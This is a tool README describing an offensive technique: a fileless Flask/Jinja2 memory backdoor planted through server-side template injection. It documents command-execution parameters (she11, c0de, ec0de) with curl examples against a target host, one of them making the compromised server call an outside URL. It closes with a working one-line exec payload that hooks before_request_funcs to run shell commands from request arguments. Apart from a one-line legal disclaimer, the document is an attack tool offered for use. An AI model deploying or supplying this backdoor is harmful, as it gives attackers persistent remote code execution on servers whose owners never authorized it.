## JinjaShip
Jinja2 template injection, route injection memory backdoor

Route injection memory backdoor is a fileless web backdoor technology that achieves in-memory persistence by dynamically adding malicious routes to Jinja2 templates, enabling remote command and code execution capability without writing code to disk files.

This project can be used after the attacker obtains the server-side template `exec` function invocation method. By executing code to directly control the functions within `flask.current_app.before_request_funcs` of Jinja2 templates, it achieves dynamic registration of malicious routes and implements memory backdoor injection.

### Usage
  **Engliash** | [Chinese](README.md)

Injection method see **end of document**

#### Parameter Passing
You can pass commands or code to be executed on the target machine via GET, POST, or UA methods as parameters

    https://target.com/?she11=whoami

    curl -X POST https://target.com/ -d "ec0de=os.getcwd()"

    curl -H "c0de: import urllib.request;urllib.request.urlopen('https://example.com')" https://target.com/


#### Parameter Usage

- **she11**

  Execute system commands, when the command returns empty, there is **no echo** on the page

  You are expected to use `echo ok %26%26 your command 2>%261` to get the echo of successful execution

- **c0de**

  exec function executes python code, this function has no echo, so there is **no echo** on the page

  When the command **errors**, it will **display echo** on the page

- **ec0de**

  eval function executes python expressions, captures the execution result and converts it to str type, and **displays echo** on the page

  Captures errors and displays echo


#### Other Matters
- When executing python code, you can directly use `app` (flask.current_app) and `os`, `request` (flask.request), these are preset global variables during backdoor injection

- You can modify the backdoor function to implement other functions, but note that when accessing web pages, js, css and other requests will also execute the backdoor function. Although no parameters will be passed, it may produce unexpected consequences

- You can execute this injection command multiple times, and it will not produce duplicate backdoor addition and execution

- You should use the injection command within the request, otherwise you will not be able to normally obtain app (Flask object) and successfully inject



### ❗Important Notes

- You should not use it for any **illegal** purposes, the author is not responsible for any illegal consequences caused by any of your actions



### Injection Method

##### **Use the exec function to execute the content inside the exec in the last line of code**

Finally, here's a one-sentence backdoor <!-- meow~ -->

    exec('''
    
    __import__('flask').current_app.before_request_funcs.setdefault(None, []).append(lambda:(None if (__import__('os').popen(__import__('flask').request.args.get('she11','')).read()) else None))
    
    ''')




